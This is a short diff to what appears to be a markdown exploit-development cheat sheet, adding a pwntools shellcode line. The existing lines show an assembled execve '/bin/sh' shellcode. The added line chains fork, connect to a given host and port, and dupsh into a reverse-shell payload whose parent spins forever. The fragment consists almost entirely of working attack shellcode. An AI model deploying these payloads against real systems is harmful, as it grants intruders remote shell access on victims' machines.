@@ -83,6 +83,7 @@ def cont_shoot(poses, vals, prev_size = 0):
 ```python
 asm(pwnlib.shellcraft.amd64.linux.sh())
 "push 0x68732f6e69622f\nmov rdi,rsp\nxor rsi,rsi\nxor rdx,rdx\npush SYS_execve\npop rax\nsyscall"
+pwnlib.shellcraft.amd64.fork() + "test rax,rax \n jz child \n self: jmp self \n child: \n" + pwnlib.shellcraft.amd64.connect(url, port) + pwnlib.shellcraft.amd64.dupsh()
 ```
 
 ## JavaScript
